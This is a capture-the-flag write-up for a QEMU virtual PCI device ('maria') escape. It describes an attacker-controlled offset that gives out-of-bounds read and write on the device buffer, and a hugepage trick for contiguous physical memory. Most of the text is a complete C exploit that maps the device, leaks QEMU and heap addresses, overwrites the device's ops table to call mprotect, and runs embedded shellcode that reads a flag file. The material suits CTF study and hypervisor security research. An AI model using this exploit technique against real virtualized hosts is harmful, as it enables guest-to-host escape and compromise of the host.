# Solution

## Vulnerability

According to the source code of `maria_mmio_write`, you can set the `src` and `offset` freely through address 0x4 and 0x8.

```c
case 0x04:
    maria->state.src = val;
    break;
case 0x08:
    maria->state.off = val;
    break;
}
```

In addition, you can read/write to `buff[offset]` through accessing address 0x0:

```
case 0x0x0:
    cpu_physical_memory_rw(maria->state.src, &maria->buff[maria->state.off], BUFF_SIZE, 1);
```

```
case 0x00:
    cpu_physical_memory_rw(maria->state.src, &maria->buff[maria->state.off], BUFF_SIZE, 0);
```

Since you control the offset, if you set the offset to `0xff`, you can write at most `BUFF_SIZE` (0x100) bytes to &buff.

## Before you solve the challenge

1. The PCI device uses `cpu_physical_memory_rw`. Coincidentally,  the buffer size is 0x1000, which is exactly the same as `PAGE_SIZE`. This means that the buffer itself and data after the buffer might be mapped to different virtual memories!
    - Solution: [hugepage](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/performance_tuning_guide/s-memory-transhuge).

## Idea

1. First, you can set `src` to the contiguous pages and `offset` to `0xf0`. This way, after calling `mmio_read`, you can achieve out-of-bound read and obtain a bunch of pointers!
2. You can overwrite `mmio->ops` with a fake `ops` to change the behavior of `mmio->ops->read` and `mmio->ops->write`. In my case, I changed `mmio->ops->write` to `mprotect`, and `mmio->ops->read` to my shellcode that executes ORW
3. Invoke `mprotect` using `mmio_write` and the shellcode using `mmio_read`

## Exploit

```c
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/types.h>
#include <inttypes.h>

unsigned char *mmio_mem;

#define PAGE_SIZE 0x1000

void mmio_write(uint32_t addr, uint32_t value) {
    *(uint32_t *)(mmio_mem + addr) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *(uint32_t *)(mmio_mem + addr);
}

void set_src(uint32_t value) {
    mmio_write(0x04, value);
}

void set_off(uint32_t value) {
    mmio_write(0x08, value);
}

void get_buff() {
    mmio_read(0x00);
}

void set_buff() {
    mmio_write(0x00, 0);
}

uint64_t gva2gpa(void *addr){
    uint64_t page = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[!] open error in gva2gpa\n");
        exit(1);
    }
    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
    read(fd, &page, 8);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}

int main() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1) {
        fprintf(stderr, "[!] Cannot open /sys/devices/pci0000:00/0000:00:05.0/resource0\n");
        exit(1);
    }
    mmio_mem = mmap(NULL, PAGE_SIZE * 4, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmio error\n");
        exit(1);
    }
    printf("[*] mmio done\n");

    // Set huge page
    system("sysctl vm.nr_hugepages=32");
    system("cat /proc/meminfo | grep -i huge");

    char *buff;
    uint64_t buff_gpa;
    while (1) {
        buff = mmap(0, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, -1, 0);
        if (buff < 0) {
            fprintf(stderr, "[!] cannot mmap buff\n");
            exit(1);
        }
        memset(buff, 0, 2 * PAGE_SIZE);
        buff_gpa = gva2gpa(buff);
        uint64_t buff_gpa_1000 = gva2gpa(buff + PAGE_SIZE);
        if (buff_gpa + PAGE_SIZE == buff_gpa_1000) {
            break;
        }
    }
    printf("[*] buff virtual address = %p\n", buff);
    printf("[*] buff physical address = %p\n", buff_gpa);
    
    set_src(buff_gpa);
    set_off(0xf0);
    get_buff();

    uint64_t *buff_u64 = (uint64_t *)buff;
    uint64_t maria_buff_addr = buff_u64[0x3fa] - 0x20b8;
    uint64_t maria_addr = maria_buff_addr - 0xa30;
    //uint64_t qemu_base = buff_u64[0x3eb] - 0xfc26a0;
    uint64_t qemu_base = buff_u64[0x3eb] - 0xf1ff80;

    //uint64_t mprotect_plt = qemu_base + 0x31f880;
    uint64_t mprotect_plt = qemu_base + 0x30c400;


    printf("[*] maria->buff address = %p\n", maria_buff_addr);
    printf("[*] maria address = %p\n", maria_addr);
    printf("[*] qemu base address = %p\n", qemu_base);
    printf("[*] mprotect@plt address = %p\n", mprotect_plt);

    buff_u64[0x0] = maria_buff_addr + 0x4f0;
    //buff_u64[0x0] = 0xdeadbeefcafebabe;
    buff_u64[0x1] = mprotect_plt;

    /* shellcode */
    char shellcode[] = {
        0xeb, 0x10, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73, 0x65, 0x72,
        0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x6a, 0x02, 0x58, 0x48, 0x8d, 0x3d,
        0xe6, 0xff, 0xff, 0xff, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x97, 0x31, 0xc0,
        0x54, 0x5e, 0x6a, 0x70, 0x5a, 0x0f, 0x05, 0x48, 0x92, 0x6a, 0x01, 0x58,
        0x6a, 0x01, 0x5f, 0x54, 0x5e, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x6a, 0x3c,
        0x58, 0x0f, 0x05
    };
    memcpy(&buff_u64[0x80], shellcode, sizeof(shellcode));

    /* overwrite maria->mmio.ops and maria->mmio.opaque */
    buff_u64[0x3ec] = maria_buff_addr & ~0xfff;             // maria->mmio.opaque
    buff_u64[0x3eb] = maria_buff_addr + 0xf0;               // maria->mmio.ops
    buff_u64[0x3eb - (maria_addr & 0xfff) / 8] = maria_buff_addr + 0xf0;// (MariaState *)(maria_addr & 0xfff)->mmio.ops

    set_src(buff_gpa);
    set_off(0xf0);
    set_buff();

    mmio_write(0x2000, 0x7);
    mmio_read(0x0);
}
```
